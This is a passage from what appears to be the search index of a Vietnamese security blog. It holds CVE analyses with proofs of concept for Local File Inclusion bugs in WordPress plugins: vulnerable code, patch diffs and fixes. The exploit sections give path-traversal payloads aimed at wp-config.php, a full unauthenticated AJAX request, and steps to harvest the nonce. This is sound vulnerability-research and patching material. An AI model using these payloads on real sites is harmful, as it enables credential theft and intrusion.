'inc/views/frontend/stdl-shortcode.php'); $form_html = ob_get_contents(); ob_clean(); return $form_html; } ","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rĐăng nhập vào WordPress bằng tài khoản Contributor có đặc quyền thấp nhất để tạo post. Step 2\rTạo post với shortcode [subscribe_to_download_form template='../../../../../../../wp-config'] Result: Debugger đã nhảy đến wp-config.php Kết quả LFI thành công ","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rĐăng nhập vào WordPress bằng tài khoản Contributor có đặc quyền thấp nhất để tạo post. Step 2\rTạo post với shortcode [subscribe_to_download_form template='../../../../../../../wp-config'] Result: Debugger đã nhảy đến wp-config.php Kết quả LFI thành công ","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/#step-1"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rĐăng nhập vào WordPress bằng tài khoản Contributor có đặc quyền thấp nhất để tạo post. Step 2\rTạo post với shortcode [subscribe_to_download_form template='../../../../../../../wp-config'] Result: Debugger đã nhảy đến wp-config.php Kết quả LFI thành công ","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/#step-2"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rPhiên bản ≤ 1.2.9 của Subscribe to Download Lite cho phép LFI vì include() dùng $atts['template'] chưa được xác thực; lỗ hổng đã được vá trong 1.3.0 bằng basename() + realpath() và kiểm tra base_dir. Cập nhật ngay. ","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key takeaways\rInput từ shortcode không được tin cậy — không include trực tiếp. Patch (v1.3.0) dùng basename() + realpath() + so sánh với thư mục cho phép. Hành động: cập nhật plugin, whitelist/validate attributes. Giám sát logs cho ký tự ../ trong tham số template. ","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/#key-takeaways"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rFile Inclusion/Path traversal — Hacktrick WordPress Subscribe to Download Lite Plugin \u003c= 1.2.9 is vulnerable to Local File Inclusion ","date":"2025-10-16","objectID":"/vi/posts/2025-10-16-cve-2025-30782/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/vi/posts/2025-10-16-cve-2025-30782/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Team Manager Plugin.","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Team Manager phiên bản ≤ 2.1.23 chứa lỗ hổng Local File Inclusion cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh include/require, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã. CVE ID: CVE-2025-30868 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 2.1.23 Patched Versions: 2.2.0 CVSS severity: Low (7.5) Required Privilege: Contributor Product: WordPress Team Manager Plugin ","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Team Manager: 2.1.23 (vulnerable) và 2.2.0 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. Elementor plugin ","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch diff\rBản lỗi: public static function renderElementorLayout(string $layout, array $data, array $settings): void { $styleTypeKey = \"{$layout}_style_type\"; $styleType = stripslashes($settings[$styleTypeKey]); $path = stripslashes(TM_PATH . '/public/templates/elementor/layouts/' . $layout . '/'); $templateName = sanitize_file_name( $styleType . '.php' ); //allowed file type $allowedFileTypes = [ 'php' ]; $ext = pathinfo($path . $templateName, PATHINFO_EXTENSION); if (in_array($ext, $allowedFileTypes)) { if (file_exists($path . $templateName)) { include self::locateTemplate($templateName, '', $path); } } } private static function locateTemplate(string $templateName, string $templatePath = '', string $defaultPath = ''): string { $templatePath = $templatePath ?: 'public/templates'; $defaultPath = $defaultPath ?: TM_PATH . '/public/templates/'; $template = locate_template(trailingslashit($templatePath) . $templateName); return $template ?: \"{$defaultPath}{$templateName}\"; } Trong phiên bản lỗi, hàm renderElementorLayout() không xác thực giá trị đầu vào. attacker có thể vượt qua logic trên khi kiểm soát được $layout và $settings, ví dụ: Trong hàm renderElementorLayout(): $layout = \"../../../../../../..\" $settings['../../../../../../.._style_type'] = \"wp-config\" Khi đó: $styleType = 'wp-config' $path = TM_PATH . '/public/templates/elementor/layouts/../../../../../../../' $templateName=wp-config.php $path . $templateName = TM_PATH . '/public/templates/elementor/layouts/../../../../../../../wp-config.php Debugger giá trị của các biến Sau khi vượt qua các mệnh đề if thì include giá trị trả về của locateTemplate(wp-config.php, '', TM_PATH . '/public/templates/elementor/layouts/../../../../../../../') : private static function locateTemplate(string $templateName, string $templatePath = '', string $defaultPath = ''): string { $templatePath = $templatePath ?: 'public/templates'; $defaultPath = $defaultPath ?: TM_PATH . '/public/templates/'; $template = locate_template(trailingslashit($templatePath) . $templateName); return $template ?: \"{$defaultPath}{$templateName}\"; } Khi đó: $templatePath = public/templates $defaultPath = TM_PATH . '/public/templates/elementor/layouts/../../../../../../../' $locate_template = locate_template('public/templates/wp-config.php') = \"\" - locate_template() sẽ trả về đường dẫn tuyệt đối của file nếu tìm thấy, ngược lại trả về chuỗi rỗng \"\". Khi $locate_template rỗng thì trả về TM_PATH . '/public/templates/elementor/layouts/../../../../../../../wp-config.php' để include. Bản vá: public static function renderElementorLayout(string $layout, array $data, array $settings): void { $allowedLayouts = ['grid', 'list', 'slider', 'table', 'isotope']; // Allowed layouts if (!in_array($layout, $allowedLayouts, true)) { wp_die(__('Invalid layout.', 'wp-team-manager')); } $styleTypeKey = \"{$layout}_style_type\"; $styleType = $settings[$styleTypeKey] ?? ''; // Ensure only safe characters (alphanumeric + underscores) if (!preg_match('/^[a-zA-Z0-9_-]+$/', $styleType)) { wp_die(__('Invalid style type.', 'wp-team-manager')); } // Ensure constants exist before using them if (!defined('TM_PATH')) { wp_die(__('TM_PATH is not defined.', 'wp-team-manager')); } // Define Free path (always available) $basePath = realpath(TM_PATH . '/public/templates/elementor/layouts/'); // Define Pro path if available $proPath = defined('TM_PRO_PATH') ? realpath(TM_PRO_PATH . '/public/templates/elementor/layouts/') : null; // Ensure the free path is valid if (!$basePath) { wp_die(__('Invalid base template path.', 'wp-team-manager')); } $templateName = sanitize_file_name($styleType . '.php'); // Define possible template paths (Pro first, then Free) $proFullPath = $proPath ? $proPath . '/' . $layout . '/' . $templateName : null; $freeFullPath = $basePath . '/' . $layout . '/' . $templateName; // Check if Pro template exists and is readable if ($proFullPath \u0026\u0026 is_readable($proFullPath) \u0026\u0026 strpos(realpath($proFullPath), $proPath) === 0) { include $proFullP","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable Code\rThông tin\rChữ Elementor trong tên hàm renderElementorLayout() liên quan đến plugin Elementor plugin trong WordPress, dùng để tạo nội dung cho post. Khi gửi request chỉnh sửa post chứa widgets Team Manager này hoặc mở post sau khi lưu thì renderElementorLayout() sẽ được gọi. Plugin element trong Elementor Bắt request chỉnh sửa bằng BurpSuite: Key settings trong request Quan sát ta thấy có key settings chứa các key layout_type và {layout_type_value}_stype_type tương ứng với code ta phân tích ở trên: $styleTypeKey = \"{$layout}_style_type\"; $styleType = stripslashes($settings[$styleTypeKey]); 👉 Ta có thể kiểm soát các giá trị ở đây. ","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rTạo team mới tại endpoint: wp-admin/post-new.php?post_type=team_manager vì khi có team thì mới có giá trị để thêm vào layout của widget Team Manager. Step 2\rTạo post bằng Elementor, thêm widgets Team Manager. Thêm Team Manager widget vào post Step 3\rSubmit, bắt request bằng BurpSuite gửi đến Repeater Step 4\rBôi đen giá trị của param action,sửa payload tại tab Inspector và gửi lại request Result: Debugger đã nhảy đến wp-config.php Kết quả LFI thành công ","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rTạo team mới tại endpoint: wp-admin/post-new.php?post_type=team_manager vì khi có team thì mới có giá trị để thêm vào layout của widget Team Manager. Step 2\rTạo post bằng Elementor, thêm widgets Team Manager. Thêm Team Manager widget vào post Step 3\rSubmit, bắt request bằng BurpSuite gửi đến Repeater Step 4\rBôi đen giá trị của param action,sửa payload tại tab Inspector và gửi lại request Result: Debugger đã nhảy đến wp-config.php Kết quả LFI thành công ","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/#step-1"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rTạo team mới tại endpoint: wp-admin/post-new.php?post_type=team_manager vì khi có team thì mới có giá trị để thêm vào layout của widget Team Manager. Step 2\rTạo post bằng Elementor, thêm widgets Team Manager. Thêm Team Manager widget vào post Step 3\rSubmit, bắt request bằng BurpSuite gửi đến Repeater Step 4\rBôi đen giá trị của param action,sửa payload tại tab Inspector và gửi lại request Result: Debugger đã nhảy đến wp-config.php Kết quả LFI thành công ","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/#step-2"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rTạo team mới tại endpoint: wp-admin/post-new.php?post_type=team_manager vì khi có team thì mới có giá trị để thêm vào layout của widget Team Manager. Step 2\rTạo post bằng Elementor, thêm widgets Team Manager. Thêm Team Manager widget vào post Step 3\rSubmit, bắt request bằng BurpSuite gửi đến Repeater Step 4\rBôi đen giá trị của param action,sửa payload tại tab Inspector và gửi lại request Result: Debugger đã nhảy đến wp-config.php Kết quả LFI thành công ","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/#step-3"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rTạo team mới tại endpoint: wp-admin/post-new.php?post_type=team_manager vì khi có team thì mới có giá trị để thêm vào layout của widget Team Manager. Step 2\rTạo post bằng Elementor, thêm widgets Team Manager. Thêm Team Manager widget vào post Step 3\rSubmit, bắt request bằng BurpSuite gửi đến Repeater Step 4\rBôi đen giá trị của param action,sửa payload tại tab Inspector và gửi lại request Result: Debugger đã nhảy đến wp-config.php Kết quả LFI thành công ","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/#step-4"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rCVE-2025-30868 là LFI trong Team Manager ≤2.1.23: renderElementorLayout() không xác thực $layout/$settings, cho phép path traversal và include() file ngoài ý muốn. Đã vá trong v2.2.0 bằng whitelist, regex và kiểm tra realpath(). ","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key takeaways\rKhông dùng input thô để build include. Dùng whitelist cho layout/template. Sanitize tên file + realpath() + is_readable() trước khi include. Với endpoint public: kiểm soát input server-side, nonce không đủ. ","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/#key-takeaways"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rFile Inclusion/Path traversal — Hacktrick WordPress Team Manager Plugin \u003c= 2.1.23 is vulnerable to Local File Inclusion ","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Motors Plugin.","date":"2025-10-14","objectID":"/vi/posts/2025-10-14-cve-2025-32654/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/vi/posts/2025-10-14-cve-2025-32654/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Motors phiên bản ≤ 1.4.71 chứa lỗ hổng Local File Inclusion cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh include/require, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã. CVE ID: CVE-2025-32654 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 1.4.71 Patched Versions: 1.4.72 CVSS severity: High (8.1) Required Privilege: Unauthenticated Product: WordPress Motors Plugin ","date":"2025-10-14","objectID":"/vi/posts/2025-10-14-cve-2025-32654/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/vi/posts/2025-10-14-cve-2025-32654/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Motors: 1.4.71 (vulnerable) và 1.4.72 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. ","date":"2025-10-14","objectID":"/vi/posts/2025-10-14-cve-2025-32654/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/vi/posts/2025-10-14-cve-2025-32654/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-10-14","objectID":"/vi/posts/2025-10-14-cve-2025-32654/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/vi/posts/2025-10-14-cve-2025-32654/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch diff\rBản lỗi: public static function motors_ew_grid_tabs() { $template = sanitize_text_field( $_POST['template'] ); // other logic } Bản lỗi chỉ lọc ký tự HTML bằng sanitize_text_field(), không giới hạn đường dẫn, nên attacker có thể chèn ../ hoặc tên file bất kỳ =\u003e LFI. Bản vá: public static function motors_ew_grid_tabs() { $allowed_templates = array( 'listing-cars/listing-grid-directory-loop-4', 'listing-cars/listing-grid-directory-loop-3', 'listing-cars/listing-grid-directory-loop', ); $template = 'listing-cars/' . ( isset( $_POST['template'] ) ? sanitize_file_name( $_POST['template'] ) : '' ); if ( ! in_array( $template, $allowed_templates, true ) ) { wp_send_json_error( 'Invalid template' ); return; } // other logic } Bản vá áp dụng sanitize_file_name() + whitelist kiểm tra hợp lệ, giúp khóa chặt input và loại bỏ hoàn toàn khả năng khai thác thông qua tham số template. ","date":"2025-10-14","objectID":"/vi/posts/2025-10-14-cve-2025-32654/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/vi/posts/2025-10-14-cve-2025-32654/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable Code\rHàm motors_ew_grid_tabs() được đăng ký làm callback cho action hook có tên \"grid_tabs_widget\" thông qua đoạn mã: add_action( 'wp_ajax_nopriv_grid_tabs_widget', array( self::class, 'motors_ew_grid_tabs' ) ); Tiền tố wp_ajax_nopriv_ cho biết action này không yêu cầu người dùng đăng nhập khi gọi đến endpoint AJAX. Do đó, endpoint thực tế có thể được truy cập công khai qua: /wp-admin/admin-ajax.php?action=grid_tabs_widget Khi đó motors_ew_grid_tabs() được gọi: public static function motors_ew_grid_tabs() { check_ajax_referer( 'motors_grid_tabs', 'security' ); $listing_types = apply_filters( 'stm_listings_post_type', 'listings' ); $tab_type = sanitize_text_field( $_POST['tab_type'] ); $per_page = intval( $_POST['per_page'] ); $template = sanitize_text_field( $_POST['template'] ); $img_size = sanitize_text_field( $_POST['img_size'] ); $args = array( 'post_type' =\u003e $listing_types, 'post_status' =\u003e 'publish', 'posts_per_page' =\u003e $per_page, ); if ( 'popular' === $tab_type ) { $args = array_merge( $args, array( 'orderby' =\u003e 'meta_value_num', 'meta_key' =\u003e 'stm_car_views', 'order' =\u003e 'DESC', ) ); } $args['meta_query'][] = array( 'key' =\u003e 'car_mark_as_sold', 'value' =\u003e '', 'compare' =\u003e '=', ); $template_args = array(); if ( ! empty( $img_size ) ) { $template_args = array( 'custom_img_size' =\u003e $img_size, ); } $listings_query = new WP_Query( $args ); if ( $listings_query-\u003ehave_posts() ) { $output = ''; ob_start(); while ( $listings_query-\u003ehave_posts() ) { $listings_query-\u003ethe_post(); do_action( 'stm_listings_load_template', $template, $template_args ); } $output .= ob_get_clean(); } wp_send_json( array( 'html' =\u003e $output, ) ); } Trong hàm motors_ew_grid_tabs(), dòng đầu tiên: check_ajax_referer( 'motors_grid_tabs', 'security' ); thực hiện kiểm tra nonce để bảo vệ khỏi CSRF (Cross-Site Request Forgery). Nếu nonce gửi từ client không hợp lệ hoặc không tồn tại, hàm này sẽ dừng toàn bộ quá trình xử lý AJAX - nghĩa là các đoạn logic phía sau (bao gồm xử lý $template, truy vấn bài viết, và render HTML) sẽ không được thực thi. public static function motors_create_nonce() { $grid_tabs_widget = wp_create_nonce( 'motors_grid_tabs' ); // other logic wp_localize_script( 'jquery', 'mew_nonces', array( 'motors_grid_tabs' =\u003e $grid_tabs_widget, // other logic ) ); } Hàm motors_create_nonce() tạo nonce cho action 'motors_grid_tabs' bằng wp_create_nonce() rồi truyền sang JavaScript qua wp_localize_script() dưới biến mew_nonces.motors_grid_tabs. Mẹo Vì lỗ hổng này là loại Unauthenticated, nên nonce không được hiển thị trong khu vực admin. Thay vào đó, hãy truy cập trang chủ sau khi plugin đã được cài đặt đầy đủ các phụ thuộc, rồi tìm từ khóa motors_grid_tabs trong mã nguồn trang để lấy giá trị nonce cần thiết. Giá trị nonce hiển thị trong mã nguồn trình duyệt Ngoài ra, trong mã nguồn trang chủ còn có đoạn JavaScript thực hiện gọi AJAX tự động đến endpoint ta đang focus: /wp-admin/admin-ajax.php?action=grid_tabs_widget khi trang được tải: \u003cscript\u003e (function($) { $(document).ready(function() { $.ajax({ type: \"POST\", url: ajaxurl, dataType: 'json', async: true, data: 'action=grid_tabs_widget\u0026tab_type=popular\u0026per_page=8\u0026template=listing-cars/listing-grid-directory-loop-4\u0026img_size=\u0026security=' + mew_nonces.motors_grid_tabs, success: function(data) { if( data.hasOwnProperty('html') ) $('#popular-tab-content').html(data.html); updateGridItemTitles(); }, }); }); })(jQuery) \u003c/script\u003e Đoạn script tự động chạy vì nằm trong $(document).ready(), nên khi trang load xong, jQuery sẽ tự thực thi hàm AJAX. Tận dụng điều này, ta reload trang chủ và bắt ajax request bằng BurpSuite, để lấy các param cần thiết do plugin cung cấp. POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: vi,en-US;q=0.7,en;q=0.3 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requeste","date":"2025-10-14","objectID":"/vi/posts/2025-10-14-cve-2025-32654/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/vi/posts/2025-10-14-cve-2025-32654/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-10-14","objectID":"/vi/posts/2025-10-14-cve-2025-32654/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/vi/posts/2025-10-14-cve-2025-32654/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rThêm code trả về trong wp-config.php để thử nghiệm \u003c?php echo \"payload\" Gửi POST request chứa LFI payload POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: vi,en-US;q=0.7,en;q=0.3 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 123 Origin: http://localhost Connection: keep-alive Referer: http://localhost/ Cookie: wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; stm_car_watched=2520 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin X-PwnFox-Color: cyan action=grid_tabs_widget\u0026tab_type=popular\u0026per_page=8\u0026template=/partials/../../../../../payload\u0026img_size=\u0026security=d15dd83890 Result: Kết quả LFI thành công ","date":"2025-10-14","objectID":"/vi/posts/2025-10-14-cve-2025-32654/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/vi/posts/2025-10-14-cve-2025-32654/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rCVE-2025-32654 là một LFI trong plugin Motors ≤1.4.71: tham số template không được ràng buộc, cho phép path traversal và include() file bất kỳ. Endpoint công khai (wp_ajax_nopriv_) và nonce xuất trên front‑end giúp kẻ tấn công dễ khai thác. Lỗ hổng được vá trong v1.4.72 bằng cách chuẩn hoá tên file và kiểm tra whitelist. ","date":"2025-10-14","objectID":"/vi/posts/2025-10-14-cve-2025-32654/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/vi/posts/2025-10-14-cve-2025-32654/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key takeaways\rKhông dùng input thô để build đường dẫn cho include. Ưu tiên whitelist template/đường dẫn hợp lệ. Chuẩn hoá (e.g. sanitize_file_name()/sanitize_key()), dùng realpath() để so sánh với thư mục gốc. Nếu endpoint phải công khai, bắt buộc kiểm soát chặt input chứ đừng chỉ trông vào nonce. ","date":"2025-10-14","objectID":"/vi/posts/2025-10-14-cve-2025-32654/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/vi/posts/2025-10-14-cve-2025-32654/#key-takeaways"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rFile Inclusion/Path traversal — Hacktrick WordPress Motors Plugin \u003c= 1.4.71 is vulnerable to Local File Inclusion ","date":"2025-10-14","objectID":"/vi/posts/2025-10-14-cve-2025-32654/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/vi/posts/2025-10-14-cve-2025-32654/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Geo Mashup Plugin.","date":"2025-10-13","objectID":"/vi/posts/2025-10-13-cve-2025-48293/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/vi/posts/2025-10-13-cve-2025-48293/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Geo Mashup phiên bản ≤ 1.13.16 chứa lỗ hổng Local File Inclusion cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh include/require, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã. CVE ID: CVE-2025-48293 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 1.13.16 Patched Versions: 1.13.17 CVSS severity: High (9.8) Required Privilege: Unauthenticated Product: WordPress Geo Mashup Plugin ","date":"2025-10-13","objectID":"/vi/posts/2025-10-13-cve-2025-48293/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/vi/posts/2025-10-13-cve-2025-48293/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Geo Mashup: 1.13.16 (vulnerable) và 1.13.17 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. ","date":"2025-10-13","objectID":"/vi/posts/2025-10-13-cve-2025-48293/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/vi/posts/2025-10-13-cve-2025-48293/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-10-13","objectID":"/vi/posts/2025-10-13-cve-2025-48293/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/vi/posts/2025-10-13-cve-2025-48293/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch diff\rBản lỗi: public static function generate_object_html( ) { $template_base = ( isset( $_GET['template'] ) ) ? $_GET['template'] : ''; // other logc load_template( GeoMashup::locate_template( $template_base ) ); } $template_base được lấy trực tiếp từ $_GET['template'] không qua bất kỳ kiểm tra/sanitize nào. Kết quả được truyền vào GeoMashup::locate_template() rồi dùng load_template() - khả năng kẻ tấn công kiểm soát đường dẫn file để include. Bản vá: public static function generate_object_html( ) { $template_base = ( isset( $_GET['template'] ) ) ? sanitize_key($_GET['template']) : ''; // other logic load_template( GeoMashup::locate_template( $template_base ) ); } sanitize_key() được áp dụng cho template =\u003e loại bỏ các ký tự không an toàn, ngăn ../, \\, và các ký tự đặc biệt làm giảm nguy cơ path traversal và LFI từ tham số template. 